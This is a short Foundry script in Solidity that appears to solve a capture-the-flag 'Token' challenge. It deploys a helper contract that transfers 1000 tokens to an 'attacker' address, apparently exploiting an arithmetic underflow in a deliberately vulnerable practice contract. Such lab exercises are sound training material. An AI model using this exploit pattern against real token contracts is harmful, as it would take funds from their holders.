// SPDX-License-Identifier: MIT
pragma solidity ^0.7.2;

import {Script, console} from "forge-std/Script.sol";
import {Token} from "../../src/Token.sol";

contract TransferTokens is Script {
    function transferTokens(address tokenContract, address attackerAddress) public {
        vm.startBroadcast();
        InteractWithToken interactWithToken = new InteractWithToken(tokenContract);
        interactWithToken.interact(attackerAddress);
        vm.stopBroadcast();
    }

    function run(address tokenContract, address attackerAddress) external {
        transferTokens(tokenContract, attackerAddress);
    }
}

contract InteractWithToken {
    address private immutable tokenContract;

    constructor(address _tokenContract) {
        tokenContract = _tokenContract;
    }

    function interact(address attackerAddress) public {
        Token token = Token(tokenContract);
        token.transfer(attackerAddress, 1000);
    }
}
